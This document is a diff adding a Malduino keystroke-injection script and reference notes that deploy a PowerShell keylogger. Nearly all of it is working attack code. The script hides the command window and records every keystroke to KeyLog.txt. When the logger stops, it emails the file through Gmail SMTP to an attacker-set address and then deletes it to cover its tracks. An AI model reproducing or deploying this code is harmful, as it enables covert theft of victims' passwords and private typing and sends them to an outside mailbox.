@@ -1,7 +1,232 @@
+Credit/Inspiration: https://www.andreafortuna.org/2019/05/22/how-a-keylogger-works-a-simple-powershell-example/
 
+YOURACCOUNTLOGIN: Your gmail account
+YOURACCOUNTPASSWORD: Your gmail password
+SENDTOACCOUNT: The email you want to send info.txt to
 
-
-
+----Malduino Script----
+REM Hide CMD
+DELAY 2000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 600
+ALT SPACE
+DELAY 100
+STRING M
+DOWNARROW
+REPEAT 500
+ENTER
+REM Capture Keys
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING function KeyLogger($logPath="KeyLog.txt") 
+ENTER
+DELAY 100
+STRING {
+ENTER
+DELAY 100
+STRING   # API declaration
+ENTER
+DELAY 100
+STRING   $APIsignatures = @'
+ENTER
+DELAY 100
+STRING [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+ENTER
+DELAY 100
+STRING public static extern short GetAsyncKeyState(int virtualKeyCode); 
+ENTER
+DELAY 100
+STRING [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ENTER
+DELAY 100
+STRING public static extern int GetKeyboardState(byte[] keystate);
+ENTER
+DELAY 100
+STRING [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ENTER
+DELAY 100
+STRING public static extern int MapVirtualKey(uint uCode, int uMapType);
+ENTER
+DELAY 100
+STRING [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ENTER
+DELAY 100
+STRING public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+ENTER
+DELAY 100
+STRING '@
+ENTER
+DELAY 100
+STRING  $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
+ENTER
+DELAY 100
+STRING     
+ENTER
+DELAY 100
+STRING   # output file
+ENTER
+DELAY 100
+STRING   $no_output = New-Item -Path $logPath -ItemType File -Force
+ENTER
+DELAY 100
+STRING 
+ENTER
+DELAY 100
+STRING   try
+ENTER
+DELAY 100
+STRING   {
+ENTER
+DELAY 100
+STRING     Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red
+ENTER
+DELAY 100
+STRING 
+ENTER
+DELAY 100
+STRING     while ($true) {
+ENTER
+DELAY 100
+STRING       Start-Sleep -Milliseconds 40            
+ENTER
+DELAY 100
+STRING       for ($ascii = 9; $ascii -le 254; $ascii++) {
+ENTER
+DELAY 100
+STRING         # get key state
+ENTER
+DELAY 100
+STRING         $keystate = $API::GetAsyncKeyState($ascii)
+ENTER
+DELAY 100
+STRING         # if key pressed
+ENTER
+DELAY 100
+STRING         if ($keystate -eq -32767) {
+ENTER
+DELAY 100
+STRING           $null = [console]::CapsLock
+ENTER
+DELAY 100
+STRING           # translate code
+ENTER
+DELAY 100
+STRING           $virtualKey = $API::MapVirtualKey($ascii, 3)
+ENTER
+DELAY 100
+STRING           # get keyboard state and create stringbuilder
+ENTER
+DELAY 100
+STRING           $kbstate = New-Object Byte[] 256
+ENTER
+DELAY 100
+STRING           $checkkbstate = $API::GetKeyboardState($kbstate)
+ENTER
+DELAY 100
+STRING           $loggedchar = New-Object -TypeName System.Text.StringBuilder
+ENTER
+DELAY 100
+STRING 
+ENTER
+DELAY 100
+STRING           # translate virtual key          
+ENTER
+DELAY 100
+STRING           if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)) 
+ENTER
+DELAY 100
+STRING           {
+ENTER
+DELAY 100
+STRING             #if success, add key to logger file
+ENTER
+DELAY 100
+STRING             [System.IO.File]::AppendAllText($logPath, $loggedchar, [System.Text.Encoding]::Unicode) 
+ENTER
+DELAY 100
+STRING           }
+ENTER
+DELAY 100
+STRING         }
+ENTER
+DELAY 100
+STRING       }
+ENTER
+DELAY 100
+STRING     }
+ENTER
+DELAY 100
+STRING   }
+ENTER
+DELAY 100
+STRING   finally
+ENTER
+DELAY 100
+STRING   {    
+ENTER
+DELAY 100
+STRING     $SMTPServer = 'smtp.gmail.com'
+ENTER
+DELAY 100
+STRING     $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+DELAY 100
+STRING     $SMTPInfo.EnableSsl = $true
+ENTER
+DELAY 100
+STRING     $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOURACCOUNTLOGIN', 'YOURACCOUNTPASSWORD');
+ENTER
+DELAY 100
+STRING     cls
+ENTER
+DELAY 100
+STRING     $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+DELAY 100
+STRING     $ReportEmail.From = 'YOURACCOUNTLOGIN'
+ENTER
+DELAY 100
+STRING     cls
+ENTER
+DELAY 100
+STRING     $ReportEmail.To.Add('SENDTOACCOUNT')
+ENTER
+DELAY 100
+STRING     cls
+ENTER
+DELAY 100
+STRING     $ReportEmail.Subject = 'Key Log Results'
+ENTER
+DELAY 100
+STRING     $ReportEmail.Body = 'The info is attached!' 
+ENTER
+DELAY 100
+STRING     $ReportEmail.Body = 'The key log info is attached!' 
+ENTER
+DELAY 100
+STRING     $ReportEmail.Attachments.Add('KeyLog.txt')
+ENTER
+DELAY 100
+STRING     $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 100
+STRING     del KeyLog.txt
+ENTER
+DELAY 100
+STRING   }
+ENTER
+DELAY 100
+STRING }
+ENTER
+DELAY 100
+STRING KeyLogger
+ENTER
+DELAY 100
 
 ----Powershell Script---- FYI, you do not need to do anything with this, this is just for reference
 function Test-KeyLogger($logPath="KeyLog.txt") 
@@ -68,6 +293,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $ReportEmail.Body = 'The key log info is attached!' 
     $ReportEmail.Attachments.Add('KeyLog.txt')
     $SMTPInfo.Send($ReportEmail)
+    del KeyLog.txt
   }
 }
 
